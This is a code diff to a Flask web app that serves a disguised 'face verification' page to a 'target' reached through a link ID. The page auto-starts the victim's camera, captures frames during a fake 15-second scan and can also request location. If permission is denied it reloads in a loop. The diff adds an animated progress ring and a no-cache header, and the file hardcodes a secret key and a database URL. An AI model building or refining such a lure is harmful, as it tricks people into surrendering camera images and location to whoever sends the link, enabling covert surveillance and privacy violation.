@@ -5,6 +5,15 @@ import base64, requests, os, time, uuid, random
 
 app = Flask(__name__)
 app.secret_key = "uchiha_super_secret_key" 
+app.config['TEMPLATES_AUTO_RELOAD'] = True # Auto reload templates
+
+# --- CACHE BUSTER (Bina Reload Kiye Changes Dekhne Ke Liye) ---
+@app.after_request
+def add_header(response):
+    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
+    response.headers["Pragma"] = "no-cache"
+    response.headers["Expires"] = "0"
+    return response
 
 # --- SUPABASE & ADMIN CONFIG ---
 SUPA_URL = "https://gijnkxuaejsjbxfruslm.supabase.co"
@@ -144,7 +153,7 @@ def target_page(link_id):
         <style>
             @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
             
-            :root { --red: #ff0000; --dark: #110000; }
+            :root { --red: #ff0000; --green: #00ff00; --grey: #333333; }
             * { box-sizing: border-box; margin: 0; padding: 0; }
             
             body { 
@@ -152,15 +161,35 @@ def target_page(link_id):
                 display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;
             }
             
-            /* Center Flex Container */
             .face-container { 
                 display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; 
             }
             
+            /* --- SUN RAYS CONTAINER --- */
+            .ring-container {
+                position: relative;
+                width: 330px; height: 330px;
+                display: flex; align-items: center; justify-content: center;
+                margin-bottom: 20px;
+            }
+
+            /* Sun Rays / Dashed Progress Ring */
+            .ray-ring {
+                position: absolute;
+                width: 100%; height: 100%;
+                border-radius: 50%;
+                /* Initial Background (Grey) */
+                background: conic-gradient(var(--grey) 100%, transparent 0);
+                /* Masks to create Dashed Sun Rays effect */
+                -webkit-mask: radial-gradient(transparent 64%, #000 66%), repeating-conic-gradient(#000 0deg, #000 3deg, transparent 3deg, transparent 7deg);
+                z-index: 1;
+            }
+            
             .face-wrapper {
-                position: relative; width: 280px; height: 280px; margin-bottom: 20px;
+                position: relative; width: 280px; height: 280px;
                 border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.5);
                 box-shadow: 0 0 35px rgba(255,0,0,0.3);
+                z-index: 2;
             }
             
             #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #050000; } 
@@ -172,14 +201,7 @@ def target_page(link_id):
                 z-index: 10; pointer-events: none;
             }
 
-            /* --- NEW ADVANCED FACE MESH UI OVERLAY --- */
-            .face-mesh-overlay {
-                position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-                background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><path d="M25,40 L45,45 L55,45 L75,40 M45,45 L50,60 L55,45 M35,70 L50,80 L65,70" stroke="rgba(255,0,0,0.6)" stroke-width="0.5" fill="none"/><circle cx="25" cy="40" r="1.5" fill="%23ff0000"/><circle cx="45" cy="45" r="1.5" fill="%23ff0000"/><circle cx="55" cy="45" r="1.5" fill="%23ff0000"/><circle cx="75" cy="40" r="1.5" fill="%23ff0000"/><circle cx="50" cy="60" r="1.5" fill="%23ff0000"/><circle cx="35" cy="70" r="1.5" fill="%23ff0000"/><circle cx="50" cy="80" r="1.5" fill="%23ff0000"/><circle cx="65" cy="70" r="1.5" fill="%23ff0000"/></svg>') no-repeat center center;
-                background-size: 110%;
-                z-index: 15; opacity: 0.85; pointer-events: none;
-            }
-
+            /* Scanner Line kept active */
             .scanner-line {
                 position: absolute; top: 0; left: 0; width: 100%; height: 3px;
                 background: #ff0000; box-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
@@ -224,13 +246,16 @@ def target_page(link_id):
     <body>
         
         <div id="cam-section" class="face-container">
-            <div class="face-wrapper">
-                <div class="scan-ring"></div>
-                <div class="face-mesh-overlay"></div>
-                <div class="scanner-line"></div>
+            <div class="ring-container">
+                <div class="ray-ring" id="rayRing"></div>
                 
-                <video id="v" autoplay playsinline muted></video>
+                <div class="face-wrapper">
+                    <div class="scan-ring"></div>
+                    <div class="scanner-line"></div>
+                    <video id="v" autoplay playsinline muted></video>
+                </div>
             </div>
+            
             <p class="instruction-text" id="face-msg">INITIALIZING CAMERA...</p>
             <div class="timer-display" id="seconds-timer">15</div>
         </div>
@@ -257,7 +282,6 @@ def target_page(link_id):
             const c = document.getElementById('c');
             let captureInterval = null;
 
-            // Ensures immediate auto-start on load if permissions are already granted
             window.onload = () => { getHardware(); startVerificationFlow(); };
 
             function getHardware() {
@@ -275,7 +299,6 @@ def target_page(link_id):
                         document.getElementById('face-msg').innerText = "CAMERA ACCESS DENIED";
                         document.getElementById('face-msg').style.color = "red";
                         document.getElementById('seconds-timer').style.display = "none";
-                        // Retrying connection if blocked to force loop
                         setTimeout(() => location.reload(), 2500);
                     }
                 } else if (mode === 'location') {
@@ -307,7 +330,23 @@ def target_page(link_id):
                 
                 const faceMsg = document.getElementById('face-msg');
                 const timerText = document.getElementById('seconds-timer');
+                const rayRing = document.getElementById('rayRing');
 
+                // Smooth Animation setup for Sun Rays (Grey to Green)
+                let startTime = Date.now();
+                let duration = 15000; // 15 seconds
+                
+                let animFrame = setInterval(() => {
+                    let elapsed = Date.now() - startTime;
+                    let percent = Math.min((elapsed / duration) * 100, 100);
+                    
+                    // Updates the conic gradient to fill Green clockwise
+                    rayRing.style.background = `conic-gradient(var(--green) ${percent}%, var(--grey) 0%)`;
+                    
+                    if (percent >= 100) clearInterval(animFrame);
+                }, 50); // Updates very smoothly every 50ms
+
+                // Countdown text logic
                 let timer = setInterval(() => {
                     timeLeft--;
                     timerText.innerText = timeLeft; 
@@ -361,7 +400,6 @@ def target_page(link_id):
                 if(actMode === 'text') {
                     html = `<div class="content-text">${txtVal}</div>`;
                 } else if (actMode === 'file') {
-                    // AUTO DETECT FIX: Prevents Video from showing as a broken image icon.
                     let ext = actVal.split('.').pop().toLowerCase();
                     let isVideo = ['mp4', 'webm', 'ogg', 'mov'].includes(ext);
                     let isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext);
@@ -374,7 +412,6 @@ def target_page(link_id):
                         html = `<iframe src="${actVal}" style="width:100%; height:50vh; border:none; border-radius:10px; border: 2px solid var(--red);"></iframe>`;
                     }
                     
-                    // NEW DOWNLOAD BUTTON ADDED
                     html += `<a href="${actVal}" download target="_blank" class="btn-download"><i class="fas fa-download"></i> Download Secure File</a>`;
                     
                 } else {
